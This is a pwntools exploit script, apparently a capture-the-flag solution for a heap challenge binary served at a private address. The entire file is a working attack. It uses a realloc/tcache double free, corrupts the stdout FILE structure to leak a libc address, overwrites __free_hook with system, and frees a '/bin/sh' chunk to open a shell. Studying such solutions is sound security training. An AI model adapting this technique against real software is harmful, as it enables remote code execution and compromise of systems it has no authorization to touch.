from pwn import *

debug=0
context.log_level='debug'


if debug:
    p=process('./pwn')
else:
    p=remote('192.168.67.15',8888)

def ru(x):
    return p.recvuntil(x,timeout=1)
    
def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)


def realloc(sz,data,wait=True):
    sl('1')
    ru('Size')
    sl(str(sz))
    ru('Content?\n')
    if sz == 0:
        if wait:
            ru('>>')
    else:
        se(data)
        if wait:
            ru('>>')

def delete():
    sl('2')
    ru('>>')

def back():
    sl('666')
    ru('>>')

realloc(0x68,'a')
realloc(0,'')
realloc(0x98,p64(0)*5+p64(0x21)+p64(0)*2+p64(0x20)+p64(0x21))
realloc(0,'')
realloc(0xa8,'c')
realloc(0,'')
realloc(0x98,'d')
for i in range(7):
    delete()
realloc(0,'')
realloc(0x68,'e')
#realloc(0x100,'\0'*0x68+p64(0x31)+'\x60\x07\xdd')
realloc(0x100,'\0'*0x68+p64(0x31)+'\x60\x77')
realloc(0,'')
realloc(0x98,'f')
realloc(0,'')
realloc(0x98,p64(0xfbad3887)+p64(0)*3+'\0',False)

data = ru(p64(0xffffffffffffffff))
if len(data) < 10 or data[:8]!=p64(0):
    exit(-1)
#gdb.attach(p)
libc = u64(data[8:16])
base = libc-0x3ed8b0
free_hook = base+0x3ed8e8
system = base+0x4f440
ru('>>')
back()

realloc(0x20,'g')
realloc(0,'')

realloc(0x100,'\0'*0x68+p64(0xa1)+p64(free_hook-8))
realloc(0,'')
realloc(0x20,'g')
realloc(0,'')
realloc(0x20,'/bin/sh\0'+p64(system))
sl('2')

print(hex(base))
p.interactive()
